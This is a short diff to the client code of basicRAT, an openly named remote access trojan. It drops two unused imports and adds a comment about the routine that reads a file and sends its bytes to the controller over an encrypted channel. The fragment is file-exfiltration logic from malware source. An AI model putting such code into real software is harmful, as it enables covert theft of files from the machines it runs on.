@@ -5,11 +5,9 @@
 # https://github.com/vesche/basicRAT
 #
 
-import base64
 import crypto
 import os
 import socket
-import time
 
 
 class Client(object):
@@ -83,6 +81,7 @@ class Client(object):
         with open(fname, 'rb') as f:
             data = f.read()
 
+        # currently using this awful method because GCM hates non-ASCII
         data = ','.join(map(str, map(ord, data)))
         self.sendGCM(data)
 
